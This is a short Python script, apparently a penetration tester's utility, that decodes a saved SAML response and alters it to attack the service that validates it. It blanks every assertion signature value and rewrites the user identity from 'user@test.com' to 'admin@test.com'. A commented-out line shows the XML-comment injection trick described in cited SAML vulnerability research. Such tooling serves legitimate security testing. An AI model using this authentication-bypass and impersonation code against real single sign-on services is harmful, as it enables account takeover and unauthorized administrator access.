"""
Utility Python3 script to manually alter a SAML Request/Response in order to manually inspect the behavior of a service validating/using the SAML Request/Response.

Useful to analyze specific cases returning a different/strange response content/code/length during the application study.

Dependencies:
    pip install xxx

References:
    https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
"""
import base64
import urllib.parse
import re
import xml.etree.ElementTree as ET

DEFAULT_ENCODING = "utf-8"
DEBUG = True
SAML_NAMESPACES = {"ds": "http://www.w3.org/2000/09/xmldsig#", "samlp": "urn:oasis:names:tc:SAML:2.0:protocol"}


def decode(saml_content):
    return base64.b64decode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def encode(saml_content):
    return base64.b64encode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def load_from_file(saml_content_file_location):
    with open(saml_content_file_location, "r", encoding=DEFAULT_ENCODING) as f:
        saml_content = urllib.parse.unquote(f.read())
    return saml_content


def save_to_file(saml_content_file_location, saml_content, url_encode=True):
    with open(saml_content_file_location, "w", encoding=DEFAULT_ENCODING) as f:
        content = saml_content
        if url_encode:
            content = urllib.parse.quote(content)
        f.write(content)


def extract_nodes(xpath_expr, saml_content):
    root = ET.fromstring(saml_content)
    return root.findall(xpath_expr, SAML_NAMESPACES)


def signature_omits_comments(saml_content):
    # See explanation on https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
    result = True
    nodes = extract_nodes(".//ds:CanonicalizationMethod", saml_content)
    for node in nodes:
        if node.attrib["Algorithm"] == "http://www.w3.org/2001/10/xml-exc-c14n#WithComments":
            result = False
    return result


def remove_assertion_signatures(saml_content):
    # Remove the content of the node "<ds:SignatureValue></ds:SignatureValue>" from all assertion signature of a SAML response
    # Exploit a case in which the Service Provider verify the signature only if it is present
    # Use a string approach to not risk to alter the response with an XML parser if it was already altered in case of vulnerabilities chaining
    signature_regex = r'<ds:SignatureValue>([a-zA-Z0-9\/=+]+)<\/ds:SignatureValue>'
    saml_content_altered = re.sub(signature_regex, "<ds:SignatureValue></ds:SignatureValue>", saml_content)
    return saml_content_altered


if __name__ == "__main__":
    # Workspace...
    input_file = "saml_response_encoded.txt"
    output_file = "saml_response_encoded_altered.txt"
    debug_file = "saml_response.xml"
    # Load and decode the SAML content
    saml_content = decode(load_from_file(input_file))
    # Do action on SAML content...
    # saml_content = saml_content.replace("admin@toto.so.com", "admin@toto.so<!---->.com")
    # print(signature_omits_comments(saml_content))
    saml_content = remove_assertion_signatures(saml_content)
    saml_content = saml_content.replace("user@test.com", "admin@test.com")
    # Encode and save the SAML content
    if DEBUG:
        save_to_file(debug_file, saml_content, False)
    save_to_file(output_file, encode(saml_content))
